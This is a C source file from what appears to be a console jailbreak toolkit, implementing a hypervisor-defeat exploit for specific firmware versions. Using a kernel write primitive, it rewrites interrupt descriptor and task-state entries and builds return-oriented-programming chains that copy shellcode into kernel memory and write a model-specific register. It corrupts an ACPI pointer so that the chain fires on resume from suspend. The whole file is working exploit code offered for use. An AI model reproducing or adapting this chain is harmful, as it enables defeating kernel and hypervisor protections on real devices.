#include "hv_defeat_0607.h"
#include "../shellcode_0607/shellcode_0607.h"
#include "config.h"
#include "utils.h"
#include <machine/segments.h>
#include <machine/tss.h>
#include <stdio.h>
#include <sys/mman.h>

#define IDT_SX 30

#define MSR_APICBASE 0x01b

#define APICBASE_ENABLED 0x00000800
#define APICBASE_BSP 0x00000100

static void setidt(int idx, uintptr_t func, int typ, int dpl, int ist) {
  struct gate_descriptor ip = {};
  ip.gd_looffset = func;
  ip.gd_selector = GSEL(GCODE_SEL, SEL_KPL);
  ip.gd_ist = ist;
  ip.gd_xx = 0;
  ip.gd_type = typ;
  ip.gd_dpl = dpl;
  ip.gd_p = 1;
  ip.gd_hioffset = func >> 16;
  kwrite(ktext + env_offset.IDT + idx * sizeof(struct gate_descriptor), &ip,
         sizeof(ip));
}

static uint64_t get_hv_stack(void) {
  if (fw >= 0x0720 && fw < 0x0800) {
    return 0x628ec000;
  }
  return -1;
}

static void build_gp_rop(uintptr_t ist) {
  uint64_t rop_buf[256] = {};
  uint64_t *rop = rop_buf;

  // Copy shellcode_0607 to pa 0.
  *rop++ = ktext + env_offset.GAD_POP_RDI_RET;
  *rop++ = pa_to_dmap(0);
  *rop++ = ktext + env_offset.GAD_POP_RSI_RET;
  *rop++ = kernel_cave_shellcode_0761;
  *rop++ = ktext + env_offset.GAD_POP_RDX_RET;
  *rop++ = shellcode_0607_bin_len;
  *rop++ = ktext + env_offset.FUN_MEMCPY;

  // wrmsr(MSR_APICBASE, get_hv_stack() | APICBASE_ENABLED | APICBASE_BSP);
  uint64_t index = MSR_APICBASE;
  uint64_t value = get_hv_stack() | APICBASE_ENABLED | APICBASE_BSP;
  *rop++ = ktext + env_offset.GAD_POP_RCX_RET;
  *rop++ = index;
  *rop++ = ktext + env_offset.GAD_POP_RAX_RET;
  *rop++ = value & 0xffffffff;
  *rop++ = ktext + env_offset.GAD_POP_RDX_RET;
  *rop++ = value >> 32;
  *rop++ = ktext + env_offset.GAD_WRMSR_RET;

  // Trigger hv code execution.
  *rop++ = ktext + env_offset.GAD_WRMSR_RET;

  kwrite(ist + 0x1000, rop_buf, (uintptr_t)rop - (uintptr_t)rop_buf);
}

static void build_sx_rop(uintptr_t ist, size_t shellcode_kernel_len) {
  uint64_t rop_buf[256] = {};
  uint64_t *rop = rop_buf;

  // Copy shellcode.
  *rop++ = ktext + env_offset.GAD_POP_RDI_RET;
  *rop++ = ktext + env_offset.KERNEL_CODE_CAVE;
  *rop++ = ktext + env_offset.GAD_POP_RSI_RET;
  *rop++ = kernel_cave_shellcode;
  *rop++ = ktext + env_offset.GAD_POP_RDX_RET;
  *rop++ = shellcode_kernel_len;
  *rop++ = ktext + env_offset.FUN_MEMCPY;

  // Jump to shellcode.
  *rop++ = ktext + env_offset.KERNEL_CODE_CAVE;

  kwrite(ist + 0x1000, rop_buf, (uintptr_t)rop - (uintptr_t)rop_buf);
}

int hv_defeat_0607(void *shellcode_kernel, size_t shellcode_kernel_len) {
  void *shellcode_0607 =
      mmap(NULL, ALIGN_UP(shellcode_0607_bin_len, PAGE_SIZE),
           PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
  memcpy(shellcode_0607, shellcode_0607_bin, shellcode_0607_bin_len);

  for (int i = 0; i < shellcode_0607_bin_len; i += PAGE_SIZE) {
    install_page_syscore(kernel_cave_shellcode_0761 + i,
                         vtophys_user((uintptr_t)shellcode_0607 + i), 0);
  }

  uintptr_t ist_gp = pa_to_dmap(alloc_page());
  build_gp_rop(ist_gp);
  kwrite64(ktext + env_offset.COMMON_TSS + 0 * sizeof(struct amd64tss) +
               offsetof(struct amd64tss, tss_ist6),
           ist_gp + 0x1000);
  setidt(IDT_GP, ktext + env_offset.GAD_ADD_RSP_28_POP_RBP_RET, SDT_SYSIGT,
         SEL_KPL, 6);

  uintptr_t ist_sx = pa_to_dmap(alloc_page());
  build_sx_rop(ist_sx, shellcode_kernel_len);
  kwrite64(ktext + env_offset.COMMON_TSS + 0 * sizeof(struct amd64tss) +
               offsetof(struct amd64tss, tss_ist7),
           ist_sx + 0x1000);
  setidt(IDT_SX, ktext + env_offset.GAD_ADD_RSP_28_POP_RBP_RET, SDT_SYSIGT,
         SEL_KPL, 7);

  // During suspend, AcpiSetFirmwareWakingVector will corrupt its own pointer,
  // and during resume it will trigger #GP, thus executing our ROP chain.
  kwrite64(ktext + env_offset.ACPIGBL_FACS,
           ktext + env_offset.ACPIGBL_FACS - 8);

  return 0;
}
